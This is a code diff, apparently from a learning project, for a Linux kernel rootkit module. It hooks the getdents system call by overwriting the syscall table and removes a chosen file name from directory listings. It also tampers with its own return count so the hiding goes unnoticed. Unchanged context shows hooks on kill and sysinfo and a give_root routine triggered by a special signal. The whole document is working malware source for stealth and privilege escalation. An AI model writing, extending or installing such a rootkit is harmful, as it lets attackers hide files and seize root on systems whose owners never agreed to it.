@@ -4,6 +4,7 @@
 #include <linux/list.h>
 #include <linux/syscalls.h>
 #include <linux/cred.h>
+#include <linux/dirent.h>
 
 #include "modify_syscalls.h"
 
@@ -24,8 +25,13 @@
 
 #define SIG_GIVE_ROOT 32
 
+// this is the filename we want to hide
+// used in hacked_getdents(...)
+#define TO_HIDE "dog.txt"
+
 asmlinkage int (*original_sysinfo)(struct sysinfo *);
 asmlinkage int (*original_kill)(pid_t, int);
+asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
 
 void update_sys_calls(void **sys_call_table){
@@ -33,10 +39,13 @@ void update_sys_calls(void **sys_call_table){
     void *modified_function_sysinfo = hacked_sysinfo;
     void **modified_at_address_kill = &sys_call_table[__NR_kill];
     void *modified_function_kill = hacked_kill;
+    void **modified_at_address_getdents = &sys_call_table[__NR_getdents];
+    void *modified_function_getdents = hacked_getdents;
 
     DISABLE_W_PROTECTED_MEMORY
     original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
     original_kill = xchg(modified_at_address_kill, modified_function_kill);
+    original_getdents = xchg(modified_at_address_getdents, modified_function_getdents);
     ENABLE_W_PROTECTED_MEMORY
 }
 
@@ -45,10 +54,13 @@ void revert_to_original(void **sys_call_table){
     void *modified_function_sysinfo = original_sysinfo;
     void **modified_at_address_kill = &sys_call_table[__NR_kill];
     void *modified_function_kill = original_kill;
+    void **modified_at_address_getdents = &sys_call_table[__NR_getdents];
+    void *modified_function_getdents = original_getdents;
 
     DISABLE_W_PROTECTED_MEMORY
     original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
     original_kill = xchg(modified_at_address_kill, modified_function_kill);
+    original_getdents = xchg(modified_at_address_getdents, modified_function_getdents);
     ENABLE_W_PROTECTED_MEMORY
 }
 
@@ -73,6 +85,44 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
             return original_kill(pid, sig);
     }
     return 0;
+}
+
+// code heavily inspired by:
+// https://exploit.ph/linux-kernel-hacking/2014/07/10/system-call-hooking/
+asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+    // run the actual system call
+    // (this returns the number of bytes read)
+    int ret = original_getdents(fd, dirp, count);
+
+    // loop through the returned struct
+    struct linux_dirent *cur = dirp;
+    int i = 0;
+    while (i < ret) {
+        // if we see the filename which we want to hide,
+        // then modify the number of bytes read
+        // & move on
+        if (strncmp(cur->d_name, TO_HIDE, strlen(TO_HIDE)) == 0) {
+            // length of the linux_dirent
+            int reclen = cur->d_reclen;
+            // calc. the next file/directory location
+            char* next_rec = (char*) cur + reclen;
+
+            //      = end location of our directory - next file/directory location
+            long len = (long) dirp + ret - (long) next_rec;
+            // move onto the next directory/file
+            // (this copies bytes from next_rec into cur)
+            memmove(cur, next_rec, len);
+            // update our return value so it isn't suspicious
+            ret -= reclen;
+        } else {
+            // we don't match -
+            // move on to the next directory/file
+            i += cur->d_reclen;
+            cur = (struct linux_dirent*) ((char*) dirp + i);
+        }
+    }
+
+    return ret;
 }
 
 void give_root(void)
